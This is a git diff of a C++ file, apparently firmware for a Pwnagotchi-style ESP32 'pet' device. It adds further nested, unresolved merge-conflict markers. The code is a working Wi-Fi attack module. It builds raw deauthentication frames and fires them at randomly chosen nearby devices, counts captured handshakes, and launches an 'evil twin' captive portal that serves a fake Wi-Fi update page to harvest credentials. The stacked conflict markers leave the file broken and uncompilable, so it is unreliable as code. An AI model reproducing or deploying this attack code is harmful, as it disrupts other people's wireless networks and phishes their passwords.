@@ -13,6 +13,7 @@
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 #include "../EvilPortal.h" // Integration
 =======
 >>>>>>> origin/merge-ready-mini-lele-v2
@@ -27,6 +28,9 @@
 =======
 #include "../EvilPortal.h" // Integration
 >>>>>>> origin/mini-lele-v2-legendary-final-release
+=======
+#include "../EvilPortal.h" // Integration
+>>>>>>> origin/mini-lele-v2-legendary-final-sync
 
 // Deauth Frame Structure
 const uint8_t deauthPacket[] = {
@@ -56,6 +60,7 @@ private:
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 >>>>>>> origin/mini-lele-v2-complete-verified
     static void macStringToBytes(String mac, uint8_t* bytes) {
@@ -69,6 +74,9 @@ private:
 =======
     static void macStringToBytes(String mac, uint8_t* bytes) {
 >>>>>>> origin/mini-lele-v2-legendary-final-release
+=======
+    static void macStringToBytes(String mac, uint8_t* bytes) {
+>>>>>>> origin/mini-lele-v2-legendary-final-sync
         int values[6];
         if (6 == sscanf(mac.c_str(), "%x:%x:%x:%x:%x:%x",
             &values[0], &values[1], &values[2], &values[3], &values[4], &values[5])) {
@@ -76,6 +84,7 @@ private:
         }
     }
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -90,11 +99,14 @@ private:
 >>>>>>> origin/mini-lele-v2-legendary-final-drivers
 =======
 >>>>>>> origin/mini-lele-v2-legendary-final-release
+=======
+>>>>>>> origin/mini-lele-v2-legendary-final-sync
 public:
     static void init() {
         stats.aps_scanned = 0;
         stats.handshakes_captured = 0;
         last_scan_time = millis();
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -112,11 +124,14 @@ public:
 >>>>>>> origin/mini-lele-v2-legendary-final-drivers
 =======
 >>>>>>> origin/mini-lele-v2-legendary-final-release
+=======
+>>>>>>> origin/mini-lele-v2-legendary-final-sync
         if (PwnPet::getStats().energy_mode > 0) {
             WiFiTools::startSniffer();
         }
     }
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -130,11 +145,14 @@ public:
 >>>>>>> origin/mini-lele-v2-legendary-final-drivers
 =======
 >>>>>>> origin/mini-lele-v2-legendary-final-release
+=======
+>>>>>>> origin/mini-lele-v2-legendary-final-sync
     static void start() {
         scan_active = true;
         WiFiTools::startSniffer();
         Serial.println("[Attack] Modo Ataque Iniciado!");
     }
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -148,6 +166,9 @@ public:
 =======
 
 >>>>>>> origin/mini-lele-v2-legendary-final-release
+=======
+
+>>>>>>> origin/mini-lele-v2-legendary-final-sync
     static bool isRunning() { return scan_active; }
 
     static void tick() {
@@ -157,6 +178,7 @@ public:
             return;
         }
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -177,6 +199,8 @@ public:
 >>>>>>> origin/mini-lele-v2-legendary-final-drivers
 =======
 >>>>>>> origin/mini-lele-v2-legendary-final-release
+=======
+>>>>>>> origin/mini-lele-v2-legendary-final-sync
         if (PwnPower::isCritical()) {
             if (scan_active) {
                 esp_wifi_stop();
@@ -199,6 +223,7 @@ public:
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 >>>>>>> origin/mini-lele-v2-complete-verified
         if (PwnPet::getHunger() > 80 && scan_active) {
@@ -212,10 +237,14 @@ public:
 =======
         if (PwnPet::getHunger() > 80 && scan_active) {
 >>>>>>> origin/mini-lele-v2-legendary-final-release
+=======
+        if (PwnPet::getHunger() > 80 && scan_active) {
+>>>>>>> origin/mini-lele-v2-legendary-final-sync
              static unsigned long last_attack = 0;
              if (millis() - last_attack > 5000) {
                  last_attack = millis();
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -226,6 +255,8 @@ public:
 >>>>>>> origin/mini-lele-v2-legendary-final-drivers
 =======
 >>>>>>> origin/mini-lele-v2-legendary-final-release
+=======
+>>>>>>> origin/mini-lele-v2-legendary-final-sync
                  if (WiFiTools::nearby_devices.size() > 0) {
                      int idx = random(0, WiFiTools::nearby_devices.size());
                      String targetMacStr = WiFiTools::nearby_devices[idx].mac;
@@ -234,6 +265,7 @@ public:
                      macStringToBytes(targetMacStr, targetBytes);
 
                      deauthTarget(targetBytes);
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -258,12 +290,15 @@ public:
 >>>>>>> origin/mini-lele-v2-legendary-final-drivers
 =======
 >>>>>>> origin/mini-lele-v2-legendary-final-release
+=======
+>>>>>>> origin/mini-lele-v2-legendary-final-sync
                  }
              }
         }
     }
 
     static void deauthTarget(uint8_t* bssid) {
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -284,12 +319,17 @@ public:
         uint8_t packet[26];
         memcpy(packet, deauthPacket, 26);
 >>>>>>> origin/mini-lele-v2-legendary-final-release
+=======
+        uint8_t packet[26];
+        memcpy(packet, deauthPacket, 26);
+>>>>>>> origin/mini-lele-v2-legendary-final-sync
         memcpy(&packet[10], bssid, 6);
         memcpy(&packet[16], bssid, 6);
 
         Serial.printf("[Attack] Enviando Deauth para %02X:%02X:%02X:%02X:%02X:%02X\n",
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -300,11 +340,14 @@ public:
 >>>>>>> origin/mini-lele-v2-legendary-final-drivers
 =======
 >>>>>>> origin/mini-lele-v2-legendary-final-release
+=======
+>>>>>>> origin/mini-lele-v2-legendary-final-sync
         for (int i = 0; i < 3; i++) {
              esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), true);
              delay(10);
         }
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -337,10 +380,16 @@ public:
         if (random(0, 100) < 10) {
             // PwnPet::addHandshake(false);
 >>>>>>> origin/mini-lele-v2-legendary-final-release
+=======
+        // Simulação de sucesso para gameplay
+        if (random(0, 100) < 10) {
+            // PwnPet::addHandshake(false);
+>>>>>>> origin/mini-lele-v2-legendary-final-sync
         }
     }
 
     static void evilTwin(String ssid) {
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -377,6 +426,10 @@ public:
         // Inicia Evil Portal
         EvilPortal::start(ssid.c_str(), "/evil_portal/01_wifi_update.html");
 >>>>>>> origin/mini-lele-v2-legendary-final-release
+=======
+        // Inicia Evil Portal
+        EvilPortal::start(ssid.c_str(), "/evil_portal/01_wifi_update.html");
+>>>>>>> origin/mini-lele-v2-legendary-final-sync
     }
 };
 
